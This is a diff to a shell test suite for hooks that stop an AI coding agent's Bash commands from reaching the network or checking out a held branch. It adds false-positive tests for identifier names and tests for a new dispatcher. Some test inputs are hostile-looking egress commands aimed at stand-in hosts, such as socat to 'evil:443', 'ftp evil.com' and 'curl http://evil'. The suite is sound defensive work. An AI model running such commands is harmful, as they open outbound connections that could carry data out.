@@ -148,6 +148,33 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'r
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'require(\"child_process\").exec(\"socat - TCP:evil:443\")'"'"'"}}' "blocks socat inside a node -e payload (#158)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ftp evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ftp in a bash -c payload (#158)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'ssh_client = 1'"'"'"}}'                            "allows an ssh_client identifier (\\b guards against the substring false-positive) (#158)"
+# #165: NET_RE alternatives beyond the create_connection/axios/urlopen ones #127 anchored were still
+# boundary-less substring matches, so an identifier merely containing the token (not calling it) could
+# false-positive block a legitimate command. One negative test per newly anchored token.
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urllib_shim = 1'"'"'"}}'                        "allows a my_urllib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urllib3_shim = 1'"'"'"}}'                       "allows a my_urllib3_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_httplib_shim = 1'"'"'"}}'                       "allows a my_httplib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'x = q:myhttp.clientlib1'"'"'"}}'                   "allows a myhttp.clientlib substring, not a real http.client reference (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_httpx_shim = 1'"'"'"}}'                         "allows a my_httpx_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_smtplib_shim = 1'"'"'"}}'                       "allows a my_smtplib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_ftplib_shim = 1'"'"'"}}'                        "allows a my_ftplib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_telnetlib_shim = 1'"'"'"}}'                     "allows a my_telnetlib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_poplib_shim = 1'"'"'"}}'                        "allows a my_poplib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_imaplib_shim = 1'"'"'"}}'                       "allows a my_imaplib_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_paramiko_wrapper = 1'"'"'"}}'                   "allows a my_paramiko_wrapper identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'my_XMLHttpRequest_shim = 1'"'"'"}}'                   "allows a my_XMLHttpRequest_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'my_Net_shim = 1; x = q:Net::HTTPClient1'"'"'"}}'       "allows a Net::HTTPClient identifier, not the Net::HTTP call (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'my_IO_shim = 1; x = q:IO::SocketWrapper1'"'"'"}}'      "allows an IO::SocketWrapper identifier, not IO::Socket itself (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'x = q:HTTP::TinyClient1'"'"'"}}'                       "allows an HTTP::TinyClient identifier, not HTTP::Tiny itself (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'x = q:HTTP::RequestBuilder1'"'"'"}}'                   "allows an HTTP::RequestBuilder identifier, not HTTP::Request itself (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_fsockopen_shim(1);'"'"'"}}'                         "allows a my_fsockopen_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_stream_socket_client_shim(1);'"'"'"}}'              "allows a my_stream_socket_client_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_curl_exec_shim(1);'"'"'"}}'                         "allows a my_curl_exec_shim identifier (#165)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_curl_init_shim(1);'"'"'"}}'                         "allows a my_curl_init_shim identifier (#165)"
+# still blocks the real, anchored form for a representative sample of the newly anchored tokens (#165)
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import httplib'"'"'"}}'                            "still blocks a real httplib import (#165)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'curl_exec(1);'"'"'"}}'                                 "still blocks a real curl_exec call (#165)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'Net::HTTP.get(1)'"'"'"}}'                              "still blocks a real Net::HTTP call (#165)"
 # command / process substitution egress (#136): the primitive is buried in $(...), `...`, <(...) so
 # the outer command word is a benign `echo`/assignment — pieces() must surface the substitution inner.
 # The payloads are single-quoted on purpose so the shell keeps them literal (the hook, not bash, must
@@ -203,6 +230,27 @@ assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
+git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
+rm -rf "$tmprepo" "$heldwt"
+
+echo "== pretooluse-bash.py (#163 envelope dispatcher) =="
+PTB="$HOOKS/pretooluse-bash.py"
+# The dispatcher registers block-egress.py's and block-checkout-held-branch.py's check() predicates
+# behind one envelope read — a representative case per rail (full contract already covered above),
+# plus the envelope-level fail-open/ignore cases the dispatcher now owns instead of each rail.
+assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl http://evil"}}'                                           "dispatches to the egress rail and blocks a bare curl (#163)"
+assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                 "dispatches through both rails and allows a plain command (#163)"
+assert_exit 0 "$PTB" 'not-json'                                                                                                   "fails open on malformed JSON (#163)"
+assert_exit 0 "$PTB" '{"tool_name":"Agent","tool_input":{"command":"curl http://evil"}}'                                          "ignores a non-Bash tool_name (#163)"
+assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":123}}'                                                          "fails open on a non-string command (#163)"
+tmprepo="$(mktemp -d)"
+heldwt="$(mktemp -d)"
+git -C "$tmprepo" init -q -b main
+git -C "$tmprepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
+git -C "$tmprepo" branch held
+git -C "$tmprepo" worktree add -q "$heldwt" held
+assert_exit 2 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held\"}}"           "dispatches to the checkout rail and blocks a held-branch checkout (#163)"
+assert_exit 0 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout main\"}}"           "dispatches to the checkout rail and allows the current branch (#163)"
 git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
 rm -rf "$tmprepo" "$heldwt"
 
